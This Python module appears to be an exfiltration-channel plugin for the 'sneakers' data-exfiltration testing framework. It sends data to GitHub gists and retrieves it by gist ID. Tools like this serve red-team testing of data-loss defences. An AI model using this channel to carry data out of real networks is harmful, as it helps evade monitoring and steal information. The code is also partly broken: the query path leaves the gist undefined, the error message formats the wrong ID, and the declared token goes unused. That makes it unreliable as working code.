from sneakers.modules import Channel
from sneakers.errors import ExfilChannel

import github3
import string
import random

class Githubc(Channel):
    info = {
        "name":         "Github",
        "author":       "davinerd",
        "description":  "Send and receive files through Github's gists",
        "comments":     ["If you do not specify a remote filename, the module will pick up a random one"]
    }

    requiredParams = {
        'sending': {
        },
        'receiving': {
        }
    }

    optionalParams = {
        'sending': {
            'username':     'Username of the user you want to authenticate.',
            'token':        'Access token',
            'name':         'Name of the gist',
            'description':  'A description of the gist'
        },
        'receiving': {
            'username':     'Username of the user you want to authenticate.',
            'token':        'Access token',
            'id':           'ID of the gist',
            'query':        'Search query string'
        }
    }

    def send(self, data):
        opt_params = None
        if 'sending' in self.optParams:
            opt_params = self.optParams['sending']

        description = ''

        if opt_params and 'name' in opt_params:
            filename = opt_params['name']
        else:
            chars = string.ascii_uppercase + string.ascii_lowercase
            filename = ''.join(random.choice(chars) for _ in range(8))

        files = {
            filename: {
                'content': data
            }
        }

        if opt_params and 'description' in opt_params:
            description = opt_params['description']

        try:
            gist = github3.create_gist(description, files)
        except Exception as err:
            raise ExfilChannel('Error creating gist: {0}'.format(err))

        return gist

    def receive(self):
        if 'receiving' in self.optParams:
            rec_params = self.optParams['receiving']
        else:
            raise ExfilChannel('You need to specify one of "query" or "id" optional parameter')

        if 'query' not in rec_params and 'id' not in rec_params:
            raise ExfilChannel('You need to specify one of "query" or "id" optional parameter')

        if 'id' in rec_params:
            try:
                gist = github3.gist(rec_params['id'])
            except Exception as err:
                raise ExfilChannel('Error retrieving the gist {0}: {1}'.format(id, err))

        gist_data = gist.as_dict()

        for gistfile in gist_data['files'].keys():
            gistdata = gist_data['files'][gistfile]['content']

        return [gistdata]

